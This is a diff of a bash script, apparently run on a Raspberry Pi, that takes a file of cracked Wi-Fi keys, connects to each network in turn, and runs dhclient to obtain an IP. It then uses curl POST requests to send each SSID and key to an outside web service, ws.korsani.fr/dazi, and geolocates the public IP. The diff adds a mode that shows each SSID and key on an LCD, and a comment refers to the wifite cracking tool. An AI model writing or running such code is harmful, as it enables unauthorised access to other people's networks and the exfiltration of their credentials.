@@ -1,5 +1,6 @@
 #!/bin/bash
 source $(dirname "$0")/libkoca.sh
+HERE=$(cd $(dirname "$0") ; pwd)
 koca_lockMe -q /tmp/$(basename "$0").lock 2
 gotRoot || echo 'Must be run as root'
 t=$(mktemp)
@@ -37,7 +38,8 @@ function connect() {
 	echo
 	return 1
 }
-function wait_for_ip() {
+function wait_for_ip()
+{
 	for i in $(seq 1 10)
 	do
 		ifconfig $if | grep -q inet && return 0
@@ -47,29 +49,64 @@ function wait_for_ip() {
 	echo
 	return 1
 }
-function display() {
+function display()
+{
 	where="$1"
 	ssid="$2"
 	key="$3"
 	case $where in
 		ws)
-			echo -n "Publication ... expiration is ${WS_EXPIRATION}s"
-			curl -X PATCH -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d wifi=$ssid > /dev/null 
-			curl -X POST  -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d $ssid=$key > /dev/null && echo 'ok' && echo $bssid >> $t
-			geoiplookup $(curl -s ws.korsani.fr/myip)
+			echo -n -e  "\rAuthenticating to $ssid ($bssid)  "
+			if connect "$ssid" "$key" "$bssid"
+			then
+				echo 'ok'
+				dhclient -1 $if
+				echo -n 'Getting ip  '
+				wait_for_ip || continue
+				echo 'ok'
+				#route add default gw 192.168.0.254
+				echo -n "Publication ... expiration is ${WS_EXPIRATION}s"
+				curl -X PATCH -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d wifi=$ssid > /dev/null 
+				curl -X POST  -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d $ssid=$key > /dev/null && echo 'ok' && echo $bssid >> $t
+				geoiplookup $(curl -s ws.korsani.fr/myip)
+				if [ -n "$UPDATE_ME" ]
+				then
+					echo 'Updating myself'
+					mount /boot
+					trap 'umount /boot' 0
+					apt-get update > /dev/null
+					apt-get -y upgrade > /dev/null
+					rpi-update
+					#$HOME/bin/wifite.py --update >/dev/null
+				fi
+				reset_if $if
+			else
+				echo 'failed'
+				echo $bssid >> $connect_fail
+			fi
+
+
 			;;
+		lcd)
+			$HERE/lcd.py backlight 1
+			$HERE/lcd.py text 0 0 $ssid:$key
+			;;
+
 	esac
 }
 while [ "$1" != "" ]
 do
 	case $1 in
 		-h)
+			echo "$(basename "$0") [ -u ] [ -c ] <where>"
 			echo " -u		: udpate files when connected"
 			echo " -c <file>	: cracked file"
+			echo "where : ws or lcd"
 			exit 0
 			;;
 		-u) export UPDATE_ME=yes;;
 		-c) export cracked=$2;shift;;
+		*) export WHERE=$1;;
 	esac
 	shift
 done
@@ -99,29 +136,6 @@ do
 		sleep 3
 		continue
 	fi
-	echo -n -e  "\rAuthenticating to $ssid ($bssid)  "
-	if connect "$ssid" "$key" "$bssid"
-	then
-		echo 'ok'
-		dhclient -1 $if
-		echo -n 'Getting ip  '
-		wait_for_ip || continue
-		echo 'ok'
-		#route add default gw 192.168.0.254
-		display ws $ssid $key
-		if [ -n "$UPDATE_ME" ]
-		then
-			echo 'Updating myself'
-			mount /boot
-			trap 'umount /boot' 0
-			apt-get update > /dev/null
-			apt-get -y upgrade > /dev/null
-			rpi-update
-			#$HOME/bin/wifite.py --update >/dev/null
-		fi
-		reset_if $if
-	else
-		echo 'failed'
-		echo $bssid >> $connect_fail
-	fi
+	display $WHERE $ssid $key
+	read	
 done
